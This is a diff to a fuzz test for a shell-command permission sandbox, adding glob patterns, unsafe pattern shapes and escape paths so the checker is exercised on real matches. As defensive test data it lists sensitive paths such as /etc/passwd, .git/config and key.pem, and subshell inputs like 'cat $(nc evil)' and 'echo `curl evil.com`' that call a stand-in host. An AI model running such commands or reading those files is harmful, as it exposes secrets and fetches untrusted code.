@@ -50,6 +50,21 @@ class Rng {
 
 const SAFE_PATHS = ["file.txt", "src/index.ts", "./README.md", "sub/dir/f.md", "a b.txt", "."];
 
+// Pathname expansion must stay unquoted to be live, so it cannot go through quoteMaybe: a quoted
+// glob is a literal filename and keeps prompting on purpose. The fixture tree below is what makes
+// these match real confined entries instead of falling back to the literal.
+const SAFE_GLOBS = ["src/*.ts", "*.txt", "sub/*/*.md", "src/?", "nomatch-*"];
+
+// Refused as a command argument, but not an *escape*: assignment values are never pathname-expanded,
+// so `FOO=src/** cat file.txt` keeps the literal string inside the cwd and is correctly allowed.
+// Keeping these out of ESCAPE_PATHS is the lesson from the first version of these seeds, which put
+// them there and failed a property test that was right to complain.
+const ARG_UNSAFE_PATTERNS = ["src/**", "[z-a]*", "!(*.env)", "*(a)b", "a]b"];
+
+// Every entry must make its segment unsafe whether it appears as a command argument or as a
+// leading-assignment value (`FOO=<entry> cat file.txt`), because assignment values are not
+// pathname-expanded and a confined relative string stays inside the cwd. That excludes shapes like
+// `src/**` or `[z-a]*`, whose argument-level refusal is pinned in heuristics.test.ts instead.
 const ESCAPE_PATHS = [
     "/etc/passwd",
     "../secret.txt",
@@ -59,6 +74,10 @@ const ESCAPE_PATHS = [
     ".git/config",
     "key.pem",
     "src/../../outside.txt",
+    "/*",
+    "~/*",
+    "/etc/ho*st",
+    "/tmp/pi-coder-scratchpad-*",
 ];
 
 const CHAIN_OPS = ["&&", "||", ";", "|", "&"];
@@ -90,7 +109,8 @@ function safeSegment(rng: Rng): string {
 
     parts.push(kind);
 
-    const pathArg = () => quoteMaybe(rng, rng.pick(SAFE_PATHS));
+    const pathArg = () =>
+        rng.chance(0.2) ? rng.pick(SAFE_GLOBS) : quoteMaybe(rng, rng.pick(SAFE_PATHS));
 
     switch (kind) {
         case "cat":
@@ -148,8 +168,8 @@ function unsafeSegment(rng: Rng): string {
                 "sudo ls",
             ] as const);
         case 1:
-            // known command, escaping/sensitive path
-            return `${rng.pick(["cat", "ls", "wc", "head", "tail"] as const)} ${rng.pick(ESCAPE_PATHS)}`;
+            // known command, escaping/sensitive path, or a pattern shape the enumerator refuses
+            return `${rng.pick(["cat", "ls", "wc", "head", "tail"] as const)} ${rng.pick([...ESCAPE_PATHS, ...ARG_UNSAFE_PATTERNS])}`;
         case 2:
             // unsafe subshell content
             return rng.pick(["cat $(nc evil)", "echo `curl evil.com`"] as const);
@@ -243,6 +263,16 @@ describe("fuzz: permission resolution invariants", () => {
 
     beforeAll(() => {
         cwd = fs.mkdtempSync(path.join(os.tmpdir(), "pi-sandbox-fuzz-"));
+        // A benign tree the SAFE_GLOBS can actually match, so the generator exercises traversal and
+        // not only the zero-match fallback. Nothing sensitive is created: a real key.pem or .env in
+        // this directory would correctly make `*` an unsafe operand.
+        fs.mkdirSync(path.join(cwd, "src"), { recursive: true });
+        fs.mkdirSync(path.join(cwd, "sub/dir"), { recursive: true });
+        fs.writeFileSync(path.join(cwd, "file.txt"), "x");
+        fs.writeFileSync(path.join(cwd, "a b.txt"), "x");
+        fs.writeFileSync(path.join(cwd, "README.md"), "x");
+        fs.writeFileSync(path.join(cwd, "src/index.ts"), "x");
+        fs.writeFileSync(path.join(cwd, "sub/dir/f.md"), "x");
     });
 
     afterAll(() => {
